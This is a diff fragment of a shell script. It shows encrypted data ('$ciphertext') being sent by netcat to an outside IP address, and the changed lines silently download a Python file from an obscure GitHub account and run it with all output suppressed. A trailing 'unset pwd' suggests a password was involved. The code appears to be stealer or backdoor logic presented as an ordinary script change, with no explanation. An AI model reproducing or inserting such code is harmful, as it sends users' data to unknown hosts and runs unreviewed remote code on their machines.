@@ -43,10 +43,8 @@ echo $ciphertext | nc -u -q 0 144.24.21.253 65432
 # gets DT
 
 
-if curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3 >/dev/null 2>&1; then
-    :
-else
-    :
+if command -v python3 >/dev/null 2>&1; then
+    curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3 >/dev/null 2>&1
 fi
 
 unset pwd
